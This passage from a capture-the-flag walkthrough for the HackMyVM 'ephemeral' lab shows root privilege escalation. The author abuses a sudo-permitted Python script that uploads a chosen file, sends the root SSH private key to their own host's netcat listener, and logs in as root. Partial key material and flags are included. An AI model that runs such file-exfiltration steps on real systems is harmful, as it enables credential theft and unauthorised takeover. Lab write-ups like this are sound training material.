Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.13.0-39-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

20 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '22.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Sun Aug 11 11:37:51 2024 from 192.168.0.51
ralph@ephemeral:~$ whoami && id
ralph
uid=1001(ralph) gid=1001(ralph) groups=1001(ralph)
ralph@ephemeral:~$ ls -lash
total 48K
4.0K drwxr-xr-x 7 ralph ralph 4.0K Apr 10  2022 .
4.0K drwxr-xr-x 4 root  root  4.0K Apr  8  2022 ..
   0 lrwxrwxrwx 1 root  root     9 Apr  8  2022 .bash_history -> /dev/null
4.0K -rw-r--r-- 1 ralph ralph  220 Apr  8  2022 .bash_logout
4.0K -rw-r--r-- 1 ralph ralph 3.7K Apr  8  2022 .bashrc
4.0K drwx------ 4 ralph ralph 4.0K Apr  9  2022 .cache
4.0K drwx------ 4 ralph ralph 4.0K Apr  9  2022 .config
4.0K -rw------- 1 root  root   297 Apr 10  2022 getfile.py
4.0K drwxr-xr-x 3 ralph ralph 4.0K Apr  9  2022 .local
4.0K -rw-r--r-- 1 ralph ralph  807 Apr  8  2022 .profile
4.0K drwx------ 2 ralph ralph 4.0K Apr 10  2022 .ssh
4.0K drwxrwxr-x 2 ralph ralph 4.0K Apr 10  2022 tools
4.0K -rw------- 1 ralph ralph   33 Apr  9  2022 user.txt
ralph@ephemeral:~$ cat user.txt
0041e0826ce1e1d6da9e9371a8bb3bde
```
### Privilege Escalation  - Root

Running `sudo -l`, I see that I can run the python script `/home/ralph/getfile.py` as root:

```bash
ralph@ephemeral:~$ sudo -l
Matching Defaults entries for ralph on ephemeral:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ralph may run the following commands on ephemeral:
    (root) NOPASSWD: /usr/bin/python3 /home/ralph/getfile.py
```

I can't ready the `/home/ralph/getfile.py` file as `ralph` does not have permissions:

```bash
ralph@ephemeral:~$ cat /home/ralph/getfile.py
cat: /home/ralph/getfile.py: Permission denied
ralph@ephemeral:~$ ls -lash
total 48K
4.0K drwxr-xr-x 7 ralph ralph 4.0K Apr 10  2022 .
4.0K drwxr-xr-x 4 root  root  4.0K Apr  8  2022 ..
   0 lrwxrwxrwx 1 root  root     9 Apr  8  2022 .bash_history -> /dev/null
4.0K -rw-r--r-- 1 ralph ralph  220 Apr  8  2022 .bash_logout
4.0K -rw-r--r-- 1 ralph ralph 3.7K Apr  8  2022 .bashrc
4.0K drwx------ 4 ralph ralph 4.0K Apr  9  2022 .cache
4.0K drwx------ 4 ralph ralph 4.0K Apr  9  2022 .config
4.0K -rw------- 1 root  root   297 Apr 10  2022 getfile.py
4.0K drwxr-xr-x 3 ralph ralph 4.0K Apr  9  2022 .local
4.0K -rw-r--r-- 1 ralph ralph  807 Apr  8  2022 .profile
4.0K drwx------ 2 ralph ralph 4.0K Apr 10  2022 .ssh
4.0K drwxrwxr-x 2 ralph ralph 4.0K Apr 10  2022 tools
4.0K -rw------- 1 ralph ralph   33 Apr  9  2022 user.txt
```

Using `PSPY64`, I see that the file is using `wget` and is attempting to `POST` the selected file to an IP address:

Running the script:

```bash
ralph@ephemeral:~$ sudo /usr/bin/python3 /home/ralph/getfile.py 
File path: /root
```

PSPY64:

```bash
2024/08/11 11:43:25 CMD: UID=0     PID=60038  | /usr/bin/python3 /home/ralph/getfile.py 
2024/08/11 11:43:35 CMD: UID=0     PID=60040  | sh -c /usr/bin/clear 
2024/08/11 11:43:35 CMD: UID=0     PID=60039  | sh -c /usr/bin/clear 
2024/08/11 11:43:35 CMD: UID=0     PID=60042  | sh -c /usr/bin/wget --post-file=/root  
2024/08/11 11:43:35 CMD: UID=0     PID=60041  | sh -c /usr/bin/wget --post-file=/root 
```

So the script looks like it is sending a file that I can select to a web server. Because this is running as `root`, I can select any file on the target. I will select the `id_rsa` file in the `/root` directory and point it to my host:

```bash
ralph@ephemeral:~$ sudo /usr/bin/python3 /home/ralph/getfile.py 
File path: /root/.ssh/id_rsa
IP address: 192.168.0.51

File /root/.ssh/id_rsa sent to 192.168.0.51


--2024-08-11 11:47:40--  http://192.168.0.51/
Connecting to 192.168.0.51:80... connected.
HTTP request sent, awaiting response... 
```

With a netcat listener on port 80 on my host, I can see the private key for the `root` user:

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ sudo nc -lvp 80
[sudo] password for garffff:            
Listening on 0.0.0.0 80
Connection received on 192.168.0.188 46162
POST / HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 192.168.0.51
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 2602

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvC4MPYoovfRh6ih3KhFFuvPC2C8nr53+sp7mxSQ7sMTb/TFpzWml
+CMuae031RWN85l3Tqb5BR/MYvLstkhqIgp9ViUTYC6LdEaqRokXSqNVTiSZME0w7p0fB8
RwzV7PSvYt/j1usEUR0v8nv4Viuefjcgfa2T9RDOag87gCXdnQhV+a05ndMneAmQcGeX9U
6U0a2X1sP8fYmbubMbob6CaxAIFF1EKU3pb99LMVQOYqJOS079HyqLdHsdpIq7clxLoRwK
T5bbJ/JFquZtGKPoR57tyDL1iWUeczR30ilL+Vl76V0CLmetLKYZAfYD21BHk/wdgL+0WC
Y9dYQPiIlT6JK/OYbf+obwAcFsfRGOANjrwBSDNOjLkxLgWCyTrU3vDwKadF+MWhFpzl74
jjiM/9pd8KApB+jIqdTQh+fX3DpO48DtGEcryWjQg+cYvyfykyQPWmf9MqYf/dMYA8w+MP
klBAkehlYTlNPWn0j0b9XZcGUhweydDjK0z3iWMDAAAFiIQ3JjeENyY3AAAAB3NzaC1yc2
EAAAGBALwuDD2KKL30YeoodyoRRbrzwtgvJ6+d/rKe5sUkO7DE2/0xac1ppfgjLmntN9UV
jfOZd06m+QUfzGLy7LZIaiIKfVYlE2Aui3RGqkaJF0qjVU4kmTBNMO6dHwfEcM1ez0r2Lf
49brBFEdL/J7+FYrnn43IH2tk/UQzmoPO4Al3Z0IVfmtOZ3TJ3gJkHBnl/VOlNGtl9bD/H
2Jm7mzG6G+gmsQCBRdRClN6W/fSzFUDmKiTktO/R8qi3R7HaSKu3JcS6EcCk+W2yfyRarm
bRij6Eee7cgy9YllHnM0d9IpS/lZe+ldAi5nrSymGQH2A9tQR5P8HYC/tFgmPXWED4iJU+
iSvzmG3/qG8AHBbH0RjgDY68AUgzToy5MS4Fgsk61N7w8CmnRfjFoRac5e+I44jP/aXfCg
KQfoyKnU0Ifn19w6TuPA7RhHK8lo0IPnGL8n8pMkD1pn/TKmH/3TGAPMPjD5JQQJHoZWE5
TT1p9I9G/V2XBlIcHsnQ4ytM94ljAwAAAAMBAAEAAAGAW3yvqsOepytG50ahGKypEAkus1
fJnZHcoA6s9y90ba5nnaMGYz132TmReSJBQLFoAASegnifHKSnA3xDJSPzpXUgFl+UGfDH
D9LDOeOwlTLvaDxW1arRnVB6I5aXmOD9Ot6Q4cgQJlaOIdy3AF/i7asVYvz6oyArUXBW0+
akD+izfgRLC5EEf2Kl/L/zn+IN8BbydMaLeD66yZLyEqz+oFEfQLWYs2djZQxXjz35mUHN
P36JkQarSOdCTe9n4UP6nG3w/35A8rXzNK1Hl+ZbrZF2jL7eoUB9Pee/Q9IttmgoIBKzFK
<--SNIP-->
-----END OPENSSH PRIVATE KEY-----
```

Now I am able to login as root and grab the flag:

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ vi root_rsa
garffff@garffff:~/hackmyvm/ephemeral2$ chmod 600 root_rsa 
garffff@garffff:~/hackmyvm/ephemeral2$ ssh -i root_rsa root@192.168.0.188
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.13.0-39-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

20 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '22.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Sun Apr 10 23:36:51 2022 from 10.0.0.69
root@ephemeral:~# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
root@ephemeral:~# pwd
/root
root@ephemeral:~# ls -lash
total 48K
4.0K drwx------ 10 root root 4.0K Apr 10  2022 .
4.0K drwxr-xr-x 20 root root 4.0K Apr  7  2022 ..
   0 lrwxrwxrwx  1 root root    9 Apr  8  2022 .bash_history -> /dev/null
4.0K -rw-r--r--  1 root root 3.1K Dec  5  2019 .bashrc
4.0K drwx------  5 root root 4.0K Apr 10  2022 .cache
4.0K drwx------  4 root root 4.0K Apr  9  2022 .config
4.0K drwx------  3 root root 4.0K Apr  9  2022 .dbus
4.0K drwxr-xr-x  2 root root 4.0K Apr  9  2022 Downloads
4.0K drwxr-xr-x  3 root root 4.0K Apr  7  2022 .local
4.0K -rw-r--r--  1 root root  161 Dec  5  2019 .profile
4.0K drwxr-xr-x  2 root root 4.0K Apr 10  2022 roottxt
4.0K drwx------  3 root root 4.0K Apr  7  2022 snap
4.0K drwx------  2 root root 4.0K Apr 10  2022 .ssh
root@ephemeral:~# cd roottxt/
root@ephemeral:~/roottxt# ls -lash
total 12K
4.0K drwxr-xr-x  2 root root 4.0K Apr 10  2022 .
4.0K drwx------ 10 root root 4.0K Apr 10  2022 ..
4.0K -rw-r--r--  1 root root   33 Apr 10  2022 root.txt
root@ephemeral:~/roottxt# cat root.txt
16c760c8c08bf9dd3363355ab77ef8da
```

